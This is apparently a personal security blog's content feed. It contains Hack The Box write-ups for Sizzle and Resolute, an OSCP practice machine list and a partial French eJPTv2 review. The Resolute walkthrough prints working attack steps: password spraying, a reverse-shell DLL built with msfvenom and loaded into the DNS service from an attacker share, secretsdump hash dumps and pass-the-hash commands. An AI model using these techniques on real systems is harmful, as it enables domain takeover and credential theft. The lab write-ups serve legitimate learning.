$krb5tgs$23$*mrlky$HTB.LOCAL$htb.local/mrlky*$13cf363d838f92b2f554ca7d39544dc6$2a295bf40a25aa1bc96fb72902c0d2ea6b9f75317fa775cf0eaf10ac623f2a707c0018c6686b04b8850bcb1552ad4de6a41da9760f103d4728e686124298703305e88766fe51b155d3f4c450597f6b18b5cd9d1104606ddb19d4ffec0c8c9fc604b60e31f0d8182f6662cf8827dd86fe98b47d83d92ce42018936eb77e8cd32fdcf5795071a93905b7770aa52a29a54f14518f74345105e6a063bb1ef0f89d7c62b39f74a2d6fff593550e34877bbf9a1eba1a38ce7c72a9cb08eea1fe91a7531055d8dac4986e0752e2a76c6e0253cf596b7f7c50e0d07c8cc998ed91183de78f8b952681ff9fb89907ffadce183e618e089e2f258a72bdde7e5accbeaa9816546eaed30e904b2016ef42662c5980517a841dd3d3a11e8d92a8095305e70d48af5e4cedc5e963e5baeceabd98dfd34453168f6608851c6a39dbcf374f76477d0755bb610435ccc2f52e99099ed03fbbf09e6aebdae9b69689330c2f401126cd22f682285759d822f30bb2c001173c3853196abfc84e4b98275024c21fb9217aaa121787b579748afa0f9e1b18a791f43abb8ea2c1e206350c42f9a380dc4a6db21cf3a6a28618936059b76908b385d7c86a4844146f60f3d9a6c3d3b91d27cfaa8e0dc74e6415018c01f20201890ace5185a1653f99524076f49386ade55fdcafad14739bd17a96ee66f691f4fe34cacbafdbae8fd288a4e49357fceefc0262b58992962eda76e3e86ece9afdaebf6c8e73e7e972978ac861a965cf878e6303a885fd894e2987422464307a17086763f22e21154b2f97a877c93adb875b81a5b04207b4a397504f4b880f2f20efe5bdcc3a2d98cd999179195a52805af350360c65d23f4f3d9ad805de29e084cc3387607690ee7526e0f20a53ffacd52a4e42cfbb4674dc2dbc83e0a8512f82f521b53d469a8b1b4879849b41e8667477a96e4befd5c5c31ed906ff1919c94291dd2a564fadd3a6a290ab8e8b86e71c1cc952e13ac6276a6750c5b36ebf08fce69b9f5231015e1c6fcf29a36b4aad2314fc127b5c8f7d65b026877765d3402dc04e44ffcf525c8a62f2e0b181533a7c1b77929ea237d0ee8d65e06ffa8eae5a3b5594fa166c3b80c86aa74bb28eb9a4f6009f12d33dcd877ff66eb702888b8cad7dc7b6c3581cf0b298f5fe1cb25bfae5309fa33eefaf5ad39c3366ef393ede1741c58a28adeb0551e07351a78bce638323793917610ef7fba33151455ed6e4f41ff76c47259ff69e9a4a:Football#7 valid the hash with CME.\n\u0026gt; crackmapexec smb 10.10.10.103 -u mrlky -p \u0026#39;Football#7\u0026#39; SMB 10.10.10.103 445 SIZZLE [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.103 445 SIZZLE [+] HTB.LOCAL\\mrlky:Football#7 Dump domain hashs : # I look bloodhound to see what i can do with the user.\nThis user has ACLs to dump domain hashes, especially to do DCsync thanks to replication ACLs.\nWe can do this with secretdump.\n\u0026gt; impacket-secretsdump HTB.local/mrlky:\u0026#39;Football#7\u0026#39;@10.10.10.103 -target-ip 10.10.10.103 -just-dc-user Administrator Impacket v0.11.0 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3 Administrator:des-cbc-md5:ad7afb706715e964 [*] Cleaning up... Get the root hash.\n# user crackmapexec smb 10.10.10.103 -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -x \u0026#39;more C:\\Users\\mrlky\\Desktop\\user.txt\u0026#39; # root \u0026gt; crackmapexec smb 10.10.10.103 -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -x \u0026#39;more C:\\Users\\Administrator\\Desktop\\root.txt\u0026#39; This machine was incredible, I learned new technique including bypass the closed kerberos port and be able to make a kerberoasting, soon ready for offshore. :)\n","date":"29 April 2024","externalUrl":null,"permalink":"/posts/sizzle/","section":"Posts","summary":"","title":"HTB Sizzle - Insane","type":"posts"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/tags/kerberoasting/","section":"Tags","summary":"","title":"Kerberoasting","type":"tags"},{"content":" Scanning : # Nmap scan to see open ports and services :\n\u0026gt; nmap 10.10.10.169 -sC -sV -Pn -T4 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-16 09:22:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m11s, deviation: 4h02m30s, median: 7m10s | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2024-03-16T09:22:34 |_ start_date: 2024-03-16T09:19:30 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2024-03-16T02:22:32-07:00 Its was a domain controleur so lets add the domaine, the FQDN and the ip to your /etc/hosts file.\necho \u0026#34;10.10.10.169 megabank.local RESOLUTE.megabank.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerat SMB : # Lets try to connect on the smb service using nul creds or null session.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\: Lets try to enumerate users in the domain.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --users [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\: SMB 10.10.10.169 445 RESOLUTE [*] Trying to dump local users with SAMRPC protocol SMB 10.10.10.169 445 RESOLUTE [+] Enumerated domain user(s) SMB 10.10.10.169 445 RESOLUTE megabank.local\\Administrator Built-in account for administering the computer/domain SMB 10.10.10.169 445 RESOLUTE megabank.local\\Guest Built-in account for guest access to the computer/domain SMB 10.10.10.169 445 RESOLUTE megabank.local\\krbtgt Key Distribution Center Service Account SMB 10.10.10.169 445 RESOLUTE megabank.local\\DefaultAccount A user account managed by the system. SMB 10.10.10.169 445 RESOLUTE megabank.local\\ryan SMB 10.10.10.169 445 RESOLUTE megabank.local\\marko Account created. Password set to Welcome123! SMB 10.10.10.169 445 RESOLUTE megabank.local\\sunita SMB 10.10.10.169 445 RESOLUTE megabank.local\\abigail SMB 10.10.10.169 445 RESOLUTE megabank.local\\marcus SMB 10.10.10.169 445 RESOLUTE megabank.local\\sally SMB 10.10.10.169 445 RESOLUTE megabank.local\\fred SMB 10.10.10.169 445 RESOLUTE megabank.local\\angela SMB 10.10.10.169 445 RESOLUTE megabank.local\\felicia SMB 10.10.10.169 445 RESOLUTE megabank.local\\gustavo SMB 10.10.10.169 445 RESOLUTE megabank.local\\ulf SMB 10.10.10.169 445 RESOLUTE megabank.local\\stevie SMB 10.10.10.169 445 RESOLUTE megabank.local\\claire SMB 10.10.10.169 445 RESOLUTE megabank.local\\paulo SMB 10.10.10.169 445 RESOLUTE megabank.local\\steve SMB 10.10.10.169 445 RESOLUTE megabank.local\\annette SMB 10.10.10.169 445 RESOLUTE megabank.local\\annika SMB 10.10.10.169 445 RESOLUTE megabank.local\\per SMB 10.10.10.169 445 RESOLUTE megabank.local\\claude SMB 10.10.10.169 445 RESOLUTE megabank.local\\melanie SMB 10.10.10.169 445 RESOLUTE megabank.local\\zach SMB 10.10.10.169 445 RESOLUTE megabank.local\\simon SMB 10.10.10.169 445 RESOLUTE megabank.local\\naoki We get a potential password in the commentaire of the domain user marko, now we can create a liste of the users and try password spraying with all of it.\nmy user list :\nAdministrator Guest krbtgt DefaultAccount ryan marko sunita abigail marcus sally fred angela felicia gustavo ulf stevie claire paulo steve annette annika per claude melanie zach simon naoki Launch password spraying.\n\u0026gt; crackmapexec smb 10.10.10.169 -u user.lst -p pass.txt --continue-on-succes | grep \u0026#39;[+]\u0026#39; SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\melanie:Welcome123! We get user and password so it was the first acces on the domaine.\nFind the way using bloodhound : # collect ldap informations :\n\u0026gt; rusthound -d megabank.local -i 10.10.10.169 -u \u0026#34;melanie\u0026#34;@\u0026#39;megabank.local\u0026#39; -p \u0026#39;Welcome123!\u0026#39; as you can see melanie is part of group Remote Management users so we can open a shell with evil-winrm because this user is abel to administrate the DC with winrm remotly.\nconnect with winrm.\n\u0026gt; evil-winrm -i 10.10.10.169 -u \u0026#39;melanie\u0026#39; -p \u0026#39;Welcome123!\u0026#39; Get users .txt on the Desktop of melanie.\nAfter enumeration with bloodhound i found this way.\nand contractor is part of group DNSAdmins like you can see ( in this case i use ADpeas. )\nin my opinion we really need to compromise the DNSAdmin group to become Domain admin\nSecurity groups | The Hacker Recipes\nMelanie to Ryan : # After lot of enumeration I found this directory.\nAnd on this directory there is another directory and on these direcotry there is a file.\n\u0026gt; cd PSTranscripts \u0026gt; gci -Hidden Directory: C:\\PSTranscripts Mode LastWriteTime Length Name ---- ------------- ------ ---- d--h-- 12/3/2019 6:45 AM 20191203 \u0026gt; cd 20191203 \u0026gt; gci -Hidden Directory: C:\\PSTranscripts\\20191203 Mode LastWriteTime Length Name ---- ------------- ------ ---- -arh-- 12/3/2019 6:45 AM 3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt so download the file localy and lets analyse it localy.\nIts looks like a powershell command history and bimgo in this script we find the password of domain user ryan\nPS\u0026gt;CommandInvocation(Invoke-Expression): \u0026#34;Invoke-Expression\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Invoke-Expression): name=\u0026#34;Command\u0026#34;; value=\u0026#34;cmd /c net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123! if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }\u0026#34; \u0026gt;\u0026gt; CommandInvocation(Out-String): \u0026#34;Out-String\u0026#34; \u0026gt;\u0026gt; ParameterBinding(Out-String): name=\u0026#34;Stream\u0026#34;; value=\u0026#34;True\u0026#34; lets valid the credential with cme.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\ryan:Serv3r4Admin4cc123! (admin) CME see ryan is admin, lets try to dump some hashes.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; --sam SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\ryan:Serv3r4Admin4cc123! (admin) SMB 10.10.10.169 445 RESOLUTE [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied but we can not do this, we need to exploit DNSadmin group.\nRyan to Domain Admin : # use evil-winrm to auth with ryan.\n\u0026gt; evil-winrm -i 10.10.10.169 -u \u0026#39;ryan\u0026#39; -p \u0026#39;Serv3r4Admin4cc123!\u0026#39; First we need to create a malicious DLL with msfvenom. that we will be injecting into a dns.exe process on a victim DNS server (DC).\nmsfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=10.10.14.9 LPORT=1337 \u0026gt; dns.dll now use this command to tell to DC to load my dll when the service start.\n\u0026gt; dnscmd.exe RESOLUTE /config /serverlevelplugindll \\\\10.10.14.9\\share\\dns.dll If we have change succefully registry value ServerLevelPluginDll points to our malicious DLL :\n\u0026gt; Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll Now stop and restart the service to get the SYSTEM SHELL.\n# start listener \u0026gt; nc -lvp 1337 # start smbserver \u0026gt; impacket-smbserver share . # start and stop dns service \u0026gt; sc.exe stop dns \u0026gt; sc.exe start dns We get the shell, we can now add ryan to group administrators and dump domain hashes\n\u0026gt; net localgroup Administrators ryan /add dump hash.\n\u0026gt; secretsdump megabank.local/ryan:\u0026#39;Serv3r4Admin4cc123!\u0026#39;@10.10.10.169 Administrator:500:aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49a9276d51927d3cd34a8ac69ae39c40::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: megabank.local\\ryan:1105:aad3b435b51404eeaad3b435b51404ee:3f653cb103e005246bc95ceb2f56e30b::: megabank.local\\marko:1111:aad3b435b51404eeaad3b435b51404ee:8276510304cefe6e77c3a9e910ba3a6a::: megabank.local\\sunita:6601:aad3b435b51404eeaad3b435b51404ee:4e67de165ebd5e604d6580b15cfc61b2::: megabank.local\\abigail:6602:aad3b435b51404eeaad3b435b51404ee:3f67ccb851b02ac4ee9f91eeddf1cac7::: megabank.local\\marcus:6603:aad3b435b51404eeaad3b435b51404ee:d546df40747f48ece7e2be7349ec8f1b::: megabank.local\\sally:6604:aad3b435b51404eeaad3b435b51404ee:9d5a37664c09e08e8be59ca3e76c262f::: megabank.local\\fred:6605:aad3b435b51404eeaad3b435b51404ee:7be0fca1b4aec94356b86e4b1de06c4f::: megabank.local\\angela:6606:aad3b435b51404eeaad3b435b51404ee:07fe48603fa7ada83e62d14e54f45127::: megabank.local\\felicia:6607:aad3b435b51404eeaad3b435b51404ee:74dce6edc0eabd905d42e0a7225b80f3::: megabank.local\\gustavo:6608:aad3b435b51404eeaad3b435b51404ee:0b03061f9b79bf6642fe92aee0a109c6::: megabank.local\\ulf:6609:aad3b435b51404eeaad3b435b51404ee:f3dfd5c45de7a953c82fbe99749057c2::: megabank.local\\stevie:6610:aad3b435b51404eeaad3b435b51404ee:eb41b7464f302e573aaa697d191b5569::: megabank.local\\claire:6611:aad3b435b51404eeaad3b435b51404ee:72dc9d1d791307cf5217c8e39a88f56a::: megabank.local\\paulo:6612:aad3b435b51404eeaad3b435b51404ee:4e2d8cc79e15e601c099170a645483e6::: megabank.local\\steve:6613:aad3b435b51404eeaad3b435b51404ee:b8de802a1e7862c6e0e19be9c2baff0f::: megabank.local\\annette:6614:aad3b435b51404eeaad3b435b51404ee:2f9b8f25ec94dd46ecb071c27dc82905::: megabank.local\\annika:6615:aad3b435b51404eeaad3b435b51404ee:5d7226ebae151a224ada8add01bdc21c::: megabank.local\\per:6616:aad3b435b51404eeaad3b435b51404ee:b66616eb72209b81edded1fe63ae8806::: megabank.local\\claude:6617:aad3b435b51404eeaad3b435b51404ee:f059af81cb6022dc5de6389d4a6e6a65::: megabank.local\\melanie:10101:aad3b435b51404eeaad3b435b51404ee:e4a22d8e7bbec871b341c88c2e94cba2::: megabank.local\\zach:10102:aad3b435b51404eeaad3b435b51404ee:434927d08ddb971a8b14e407a58f6e9e::: megabank.local\\simon:10103:aad3b435b51404eeaad3b435b51404ee:25bc108c637a551f8b000054ea8ddc6e::: megabank.local\\naoki:10104:aad3b435b51404eeaad3b435b51404ee:07a1070c03b1a26e53d265d27ecb1a38::: RESOLUTE$:1000:aad3b435b51404eeaad3b435b51404ee:bd0c6f595fb4c21bab7d150c487183ed::: MS02$:1104:aad3b435b51404eeaad3b435b51404ee:7b71dcfa93cf1f5d37d34497b632c890::: connect with admin hash and get the flag.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;administrator\u0026#39; -H fb3b106896cdaa8a08072775fbd9afe9 -x \u0026#39;more C:\\Users\\Administrator\\Desktop\\root.txt\u0026#39; Credits : # Escalate to DA from DNSAdmins :\nEscalating Privileges with DNSAdmins Group‚Ää‚Äî‚ÄäActive Directory\nmalicious dll with msfvenom :\nMeterpreter shell as a 32 \u0026amp; 64 Bit DLL\n","date":"17 March 2024","externalUrl":null,"permalink":"/posts/resolute/","section":"Posts","summary":"","title":"HTB-Resolute | OSCP Like","type":"posts"},{"content":" HacktheBox TJ Null list : # Voici ma liste perso de machines HTB pour pr√©parer l\u0026rsquo;OSCP, bien sur inspir√© de la tr√©s connus TJ Null lists.\nEasy Machines : # Sense - Linux https://app.hackthebox.com/machines/Sense Valentine - Linux https://app.hackthebox.com/machines/Valentine Networked - Linux https://app.hackthebox.com/machines/Networked Swag Shop - Linux https://app.hackthebox.com/machines/SwagShop BountyHunter - Linux https://app.hackthebox.com/machines/BountyHunter Irked - Linux https://app.hackthebox.com/machines/Irked Tabby - Linux https://app.hackthebox.com/machines/Tabby Optimum - Windows https://app.hackthebox.com/machines/Optimum Artic - Windows https://app.hackthebox.com/machines/Arctic Bounty - Windows https://app.hackthebox.com/machines/Bounty Jerry - Windows https://app.hackthebox.com/machines/Jerry Mirai - Linux https://app.hackthebox.com/machines/194 Medium Machines : # Jarvis - Linux https://app.hackthebox.com/machines/Jarvis Magic - Linux https://app.hackthebox.com/machines/Magic TarTarSauce - Linux https://app.hackthebox.com/machines/TartarSauce Node - Linux https://app.hackthebox.com/machines/Node Cronos - Linux https://app.hackthebox.com/machines/Cronos Bastrard - Windows https://app.hackthebox.com/machines/Bastard Silo - Windows https://app.hackthebox.com/machines/Silo Chatterbox - Windows https://app.hackthebox.com/machines/Chatterbox Resolute - Windows https://app.hackthebox.com/machines/Resolute Hard Machines : # Kotarak - Linux https://app.hackthebox.com/machines/Kotarak Control - Windows https://app.hackthebox.com/machines/218 Conceal - Windows https://app.hackthebox.com/machines/Conceal ","date":"16 March 2024","externalUrl":null,"permalink":"/posts/my-first-post/","section":"Posts","summary":"","title":"TJ Null List","type":"posts"},{"content":" eJPTv2 Review FR # cette review est en quatre parties # Les cours et le PATH\nComment pr√©parer l\u0026rsquo;exam hors cours de l\u0026rsquo;INE\nL\u0026rsquo;examen\nCe qui manque √† la certification\nLes cours et Le PATH # Apr√®s votre paiement, vous obtiendrez l\u0026rsquo;acces au PATH \u0026lsquo;Penetration Tester student\u0026rsquo; de l\u0026rsquo;INE. Les cours sont dirig√©s par Josh Mason, mais principalement enseign√©s par Alexi Hamed, √©galement connu sous le nom de @Hackersploit. Le parcours dure 148 heures et est tr√®s complet. Vous aborderez tous les aspects fondamentaux du pentesting √† travers des vid√©os explicatives, suivies de travaux pratiques dans un laboratoire pour mettre en pratique ce que vous venez d\u0026rsquo;apprendre. Vous disposerez d\u0026rsquo;un fichier PDF pour chaque laboratoire, afin de prendre des notes. Personnellement, j\u0026rsquo;ai enregistr√© toutes mes notes dans une base de donn√©es personnelle, car c\u0026rsquo;est ma m√©thode de travail. Je recommande l\u0026rsquo;utilisation de l\u0026rsquo;outil Notion pour ce type de prise de notes.\nComme mentionn√© pr√©c√©demment, le contenu des cours est tr√®s complet. Vous commencerez par une section sur les technologies d\u0026rsquo;√©valuation, qui, pour √™tre honnete n\u0026rsquo;a pas √©t√© faite en entier. Le module sur la ¬´ Information Gathering ¬ª est particuli√®rement int√©ressant, car il traite de toutes les m√©thodes de recherche sur des sources ouvertes pour obtenir des informations sur votre cible via internet (anim√© par Hackersploit).\nLa section la plus captivante est la troisi√®me, intitul√©e ¬´Host \u0026amp; Network Penetration Testing¬ª. Cette section √† elle seule pourrait suffire pour r√©ussir l\u0026rsquo;examen. Vous y apprendrez √† comprendre et √† utiliser le framework Metasploit, qui occupe une place centrale dans cette certification. Vous passerez en revue tous les aspects d\u0026rsquo;un test de p√©n√©tration, notamment le scan actif via nmap et ses divers scripts (NSE), l\u0026rsquo;√©num√©ration des services r√©seau tels que smb, ssh, ftp, rdp, mysql, apache, smtp, et j\u0026rsquo;en oublie s√ªrement. Vous apprendrez ensuite comment exploiter ces vuln√©rabilit√©s pour acc√©der √† une machine ou √† un serveur apr√®s les avoir identifi√©es. Dans la m√™me veine, il y a une section consacr√©e √† la post-exploitation, qui inclut l\u0026rsquo;√©num√©ration et les √©l√©vations de privil√®ges sous Linux et Windows, diverses techniques de persistance, du pivotage avec Meterpreter, ainsi qu\u0026rsquo;une petite partie sur l\u0026rsquo;effacement des traces. Vous serez √©galement initi√© √† des attaques telles que l\u0026rsquo;empoisonnement ARP et les attaques WiFi. En ce qui concerne l\u0026rsquo;exploitation web, le parcours part vraiment de z√©ro, alors prenez des notes d√©taill√©es sur les attaques par force brute sur les formulaires de connexion http-post avec l\u0026rsquo;outil Hydra, car cela peut s\u0026rsquo;av√©rer utile lors de l\u0026rsquo;examen. En r√©alit√©, cette certification ne se penche que tr√®s rarement, voire jamais, sur l\u0026rsquo;exploitation manuelle des vuln√©rabilit√©s, ce qui est dommage, car parfois, vous pouvez exploiter une vuln√©rabilit√© sans vraiment comprendre pourquoi vous avez obtenu une ex√©cution de code √† distance (RCE).\nEn ce qui concerne la difficult√© des cours, ils restent au niveau tr√®s basique du pentesting. Cependant, je recommande tout de m√™me d\u0026rsquo;avoir une connaissance pr√©alable de l\u0026rsquo;utilisation du terminal, de l\u0026rsquo;environnement Linux et des bases solides en r√©seautique. Avant de suivre cette certification, j\u0026rsquo;avais travaill√© sur TryHackMe, en particulier le parcours Junior Penetration Tester. Je ne peux que vous conseiller de faire ce parcours au pr√©alable.\nLa majeure partie des cours est dispens√©e par Hackersploit, et c\u0026rsquo;est vraiment un plaisir de suivre ses enseignements. Personnellement, j\u0026rsquo;ai des difficult√©s avec l\u0026rsquo;anglais, surtout lorsque les gens parlent rapidement. J\u0026rsquo;avais donc un peu peur de manquer des informations, mais Hackersploit parle anglais de mani√®re pos√©e, ce qui m\u0026rsquo;a beaucoup aid√©. Gr√¢ce √† lui, j\u0026rsquo;ai m√™me progress√© en anglais. Pour vous donner une id√©e, j\u0026rsquo;ai commenc√© √† regarder les vid√©os avec des sous-titres en anglais, mais vers le milieu du parcours, je n\u0026rsquo;en avais plus besoin, tant le niveau d\u0026rsquo;anglais de Hackersploit est agr√©able. En ce qui concerne les explications techniques, elles sont √©galement tr√®s claires. Hackersploit explique tout ce qu\u0026rsquo;il fait et ne va pas trop vite.\nPr√©paration Compl√©mentaire avec CTF et Machines Pratiques # Je suis convaincu que les cours fournissent une base solide pour l\u0026rsquo;examen, cependant, pour renforcer mes comp√©tences, j\u0026rsquo;ai choisi d\u0026rsquo;aller au-del√† et de m\u0026rsquo;engager dans divers CTF en parall√®le avec le parcours. Cette approche a grandement contribu√© √† ma r√©ussite √† l\u0026rsquo;examen. Je m\u0026rsquo;√©tais d√©j√† int√©ress√© aux CTF avant de commencer la certification. √âtant donn√© le manque d\u0026rsquo;accent mis sur l\u0026rsquo;exploitation manuelle dans le parcours, j\u0026rsquo;ai consacr√© beaucoup de temps √† relever des d√©fis sur RootMe. Cela m\u0026rsquo;a pouss√© √† exploiter des vuln√©rabilit√©s de mani√®re manuelle et √† mettre en pratique le principe ¬´ Lisez le foutu manuel ¬ª.\nPendant la derni√®re semaine pr√©c√©dant l\u0026rsquo;examen, j\u0026rsquo;ai concentr√© mes efforts sur les challenges Boot2Root de TryHackMe et HackTheBox. Cela a √©t√© rendu possible gr√¢ce √† l\u0026rsquo;acc√®s gratuit temporaire √† des machines retir√©es, qui s\u0026rsquo;est av√©r√© tr√®s enrichissant. Je recommande de r√©soudre les machines suivantes avant l\u0026rsquo;examen :\nTryHackMe : # Basic Pentesting Relevant Daily Bugle Ice Blue Skynet Tomghost Brute It GamingServer Anonymous Blog 0day Alfred Steel Mountain Hackparc HackTheBox : # Timelapse Devel MonitorsTwo Pilgrimage VulnHub : # DerpNstink Stapler 1 My Web Server Exp√©rience de l\u0026rsquo;Examen de Certification # L\u0026rsquo;environnement de l\u0026rsquo;examen est bas√© sur Guacamole. Mon environnement √©tait stable, mais il y a des contraintes √† consid√©rer. Par exemple, j\u0026rsquo;ai voulu me connecter √† un serveur via Evil-WinRM, mais l\u0026rsquo;outil n\u0026rsquo;√©tait pas install√© et l\u0026rsquo;environnement n\u0026rsquo;est pas connect√© √† Internet, ce qui signifie qu\u0026rsquo;il n\u0026rsquo;y avait pas de possibilit√© d\u0026rsquo;installer de paquets. Le manque d\u0026rsquo;acc√®s VPN pour utiliser nos propres machines d\u0026rsquo;attaque a √©t√© une restriction, ce qui est dommage. J\u0026rsquo;ai ressenti des limitations dans mes choix d\u0026rsquo;attaques. Vous avez une marge de temps confortable, car vous disposez de 48 heures pour r√©pondre aux questions, qui parfois vous aident √† progresser dans le laboratoire.\nLe contexte de l\u0026rsquo;examen est le suivant : vous vous trouvez dans une DMZ avec plusieurs h√¥tes √† l\u0026rsquo;int√©rieur. Vous devez trouver un moyen d\u0026rsquo;acc√©der √† plusieurs d\u0026rsquo;entre eux (dans mon cas, il s\u0026rsquo;agissait de 4 serveurs, dont 3 Windows et 1 Linux). En utilisant l\u0026rsquo;un de ces serveurs, vous devez √©tablir une connexion avec Meterpreter pour pivoter sur un r√©seau interne (dans mon cas, un r√©seau Linux).\nEn v√©rit√©, la plupart des √©l√©ments de l\u0026rsquo;examen auraient pu √™tre r√©alis√©s avec Metasploit, du moins une grande partie. Cependant, ce n\u0026rsquo;est pas toujours avantageux, car certains modules de Metasploit peuvent √©chouer, et vous ne pouvez pas toujours compter sur des preuves de concept depuis GitHub comme vous le feriez habituellement. Vous devez √™tre capable de faire fonctionner vos modules. De plus, le fait de ne pas pouvoir copier-coller entre votre ordinateur h√¥te et l\u0026rsquo;environnement Guacamole ajoute une complexit√©. En ce qui concerne les vuln√©rabilit√©s, la plupart d\u0026rsquo;entre elles √©taient couvertes dans les cours, mais certaines ne l\u0026rsquo;√©taient pas. C\u0026rsquo;est ici que l\u0026rsquo;exp√©rience acquise lors des CTF m\u0026rsquo;a √©t√© d\u0026rsquo;une grande aide, car j\u0026rsquo;ai pu exploiter des vuln√©rabilit√©s que je n\u0026rsquo;avais pas vues pendant le parcours.\nAu total, j\u0026rsquo;ai pass√© 7 heures pour l\u0026rsquo;examen et j\u0026rsquo;ai obtenu la certification avec un score de 91% (le seuil de r√©ussite est de 70%).\nMes conseils sont simples\u0026hellip; Brute forcer moi ces services xD ! Plus s√©rieusement, l\u0026rsquo;examen se rapproche davantage de la r√©alit√© (du moins je le pense, n\u0026rsquo;ayant jamais fait de missions de pentesting). Ce n\u0026rsquo;est pas un CTF. Suivez bien votre m√©thodologie, prenez le temps de scanner minutieusement votre cible √† l\u0026rsquo;aide de scripts Nmap pour obtenir autant d\u0026rsquo;informations que possible. Prenez des notes sur vos r√©sultats, car il y a de nombreux h√¥tes √† exploiter, et vous pourriez vous perdre dans les informations.\nEn ce qui concerne le pivoting, assurez-vous de rep√©rer le point de pivot en consultant les cartes r√©seau √† l\u0026rsquo;aide d\u0026rsquo;une commande comme ifconfig (dans le cas de Meterpreter). Il y aura forc√©ment un point de pivot, ne le manquez pas. Essayez de tirer parti de Metasploit autant que possible, car les questions peuvent souvent tourner autour de Metasploit, ce qui vous aidera √† r√©pondre.\nEn termes de post-exploitation, n\u0026rsquo;oubliez pas de mettre en place de la persistance. Cela peut sembler √©vident, mais cela peut vous faire gagner du temps. J\u0026rsquo;ai personnellement gagn√© du temps en fermant mon navigateur Firefox qui chargeait un reverse shell. Heureusement, gr√¢ce √† la persistance, je n\u0026rsquo;ai pas eu √† refaire toute l\u0026rsquo;exploitation. Pour l\u0026rsquo;√©l√©vation des privil√®ges sur les h√¥tes Windows, dans mon cas je n\u0026rsquo;ai pas eu a √©l√©vers mes privilges, mais pour le syst√®me Linux, j\u0026rsquo;ai du passer par pluseiure phase d\u0026rsquo;√©l√©vation. N\u0026rsquo;oubliez pas de r√©utiliser les mots de passe que vous avez trouv√©s pour vous connecter en tant qu\u0026rsquo;utilisateur local.\nPour finir, utilisez les questions fournies comme des indices. √Ä un moment donn√©, j\u0026rsquo;√©tais bloqu√© dans ma recherche du point de pivot, mais une question m\u0026rsquo;a orient√© vers la vuln√©rabilit√© √† exploiter, ce qui m\u0026rsquo;a permis de progresser.\nLacune dans la Certification # Une lacune notable dans la certification r√©side dans l\u0026rsquo;absence d\u0026rsquo;une section consacr√©e au reporting. Je suis d\u0026rsquo;avis que le pentest ne se limite pas seulement √† l\u0026rsquo;exploitation, mais √©galement √† la communication des r√©sultats. Un rapport de pentest rev√™t une importance capitale, car il documente les vuln√©rabilit√©s d√©couvertes, les m√©thodes utilis√©es pour les exploiter, ainsi que les 